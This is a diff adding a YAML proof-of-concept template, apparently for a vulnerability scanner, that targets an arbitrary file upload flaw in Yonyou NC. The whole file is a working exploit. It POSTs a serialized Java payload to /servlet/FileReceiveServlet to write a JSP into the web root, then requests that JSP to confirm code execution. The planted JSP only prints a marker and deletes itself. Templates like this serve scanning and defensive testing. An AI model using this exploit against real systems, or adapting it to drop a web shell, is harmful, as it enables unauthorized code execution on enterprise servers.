@@ -1,0 +1,36 @@
+id: poc-yaml-yonyou-nc-arbitrary-file-upload
+info:
+  name: Yonyou Nc 任意文件上传漏洞
+  severity: high
+  tags:
+  - 文件上传
+  finger: 用友-NC-Cloud
+  reference: []
+  description: null
+variables:
+  r1: random_int(10000, 20000)
+  r2: random_int(100000, 200000)
+  r3: str("\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\a\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\fw\b\x00\x00\x00\x10\x00\x00\x00\x02t\x00\tFILE_NAMEt\x00\t")
+  r4: str(".jspt\x00\x10TARGET_FILE_PATHt\x00\x10./webapps/nc_webx")
+transport: http
+requests:
+- method: POST
+  path: /servlet/FileReceiveServlet
+  headers:
+    Content-Type: multipart/form-data;
+  data: '{{.r3}}{{.r1}}{{.r4}}<%out.print("{{.r2}}poc123");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>'
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200
+  output: []
+- method: GET
+  path: /{{.r1}}.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, r2 + "poc123")
+  output: []
